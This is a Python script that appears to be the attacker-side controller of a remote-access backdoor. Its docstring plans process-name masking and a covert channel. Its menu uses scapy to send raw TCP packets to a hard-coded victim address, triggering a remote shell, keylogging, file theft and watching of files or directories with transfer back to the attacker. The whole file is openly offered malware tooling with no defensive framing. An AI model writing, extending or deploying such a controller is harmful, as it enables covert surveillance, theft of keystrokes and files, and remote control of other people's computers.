#!/usr/bin/env python3.10

"""
- Create attacker/victim programs
- Mask process name
- Probably use covert channel

- Menu:
    - Start/stop keylogger
    - Transfer file from victim to attacker
    - Start/stop watching file for changes. If change, transfer to attacker
    - Start/stop watching directory. If change, transfer to attacker

"""


from scapy.all import *
import sys, time


is_running = False


def init_func(mode):
    delimiter = "|"
    contents = mode + delimiter

    pkt = IP(dst="192.168.1.65")/TCP(sport=RandShort(), dport=8505)/Raw(load=contents)

    send(pkt, verbose=False)
    #time.sleep(1)


def main():
    print("Select option (e.g., 1 for keylogging). Enter 'q' to quit:\n")
    print("[1] Remote shell\n[2] Remote keylogging\n[3] Get file\n[4] Watch a file\n[5] Watch a directory\n[q] Quit")

    global is_running

    # Parse menu options
    while True:
        option = input("")

        if option == "1":
            if is_running == False:
                print("[Remote shell] Started")
                is_running = True
                init_func("remShell")
            else:
                print("[Remote shell] Stopped")
                is_running = False
                init_func("remShell")

        # Remote keylogging
        elif option == "2":    
            if is_running == False:
                print("[Remote keylogging] Started")
                is_running = True
                init_func("keylog")
            else:
                print("[Remote keylogging] Stopped")
                is_running = False
                init_func("keylog")
        
        # Get file
        elif option == "3":
            if is_running == False:
                print("[Get file] Started")
                is_running = True
                init_func("getfile")
            else:
                print("[Get file] Stopped")
                is_running = False
                init_func("getfile")
        
        # Watch file
        elif option == "4":
            if is_running == False:
                print("[Watch file] Started")
                is_running = True
                init_func("watchfile")
            else:
                print("[Watch file] Stopped")
                is_running = False
                init_func("watchfile")
            # break
        
        # Watch directory
        elif option == "5":
            if is_running == False:
                print("[Watch directory] Started")
                is_running = True
                init_func("watchdir")
            else:
                print("[Watch directory] Stopped")
                is_running = False
                init_func("watchdir")
            # break

        # Quit
        elif option == "q":
            print("Bye!")
            init_func("quit")
            break

        # Invalid option
        else:
            print("Invalid option - try again (or 'q' to quit)...")
    
    sys.exit()
        

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting program...")
        sys.exit()
